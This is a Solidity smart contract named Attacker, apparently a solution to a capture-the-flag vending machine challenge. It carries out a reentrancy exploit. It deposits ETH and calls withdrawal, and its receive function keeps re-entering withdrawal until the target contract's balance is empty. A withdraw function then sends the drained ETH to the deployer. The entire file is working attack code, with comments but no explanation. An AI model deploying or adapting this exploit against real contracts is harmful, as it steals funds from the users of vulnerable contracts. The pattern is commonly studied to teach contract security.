// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./interfaces/IVendingMachine.sol";

/**
* @title Attacker 
* @author kyrers
* @notice Execute the attack on the vending machine
*/
contract Attacker {
    /*------------------------------------------------------------
                                 VARIABLES
    --------------------------------------------------------------*/
    address private owner;
    IVendingMachine private vendingMachine;

    /*------------------------------------------------------------
                                 FUNCTIONS
    --------------------------------------------------------------*/

    /**
    * @notice Constructor
    * @param _vendingMachine The vending machine address
    */
    constructor(address _vendingMachine) {
        owner = msg.sender;
        vendingMachine = IVendingMachine(_vendingMachine);
    }

    /**
    * @notice Attack
    */
    function attack() external payable {
        //Make the deposti
        vendingMachine.deposit{ value: msg.value }();

        //Start the exploit
        vendingMachine.withdrawal();
    }

    /**
    * @notice Withdraw the exploited ETH to your account
    */
    function withdraw() external {
        // Withdraw all the funds in the contract
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to withdraw ETH");
    }

    /**
    * @notice The receive function that will be called by the vending machine
    * @dev This also processes the reentrancy attack
    */
    receive() external payable {
        if (address(vendingMachine).balance != 0) {
            vendingMachine.withdrawal();
        }
    }
}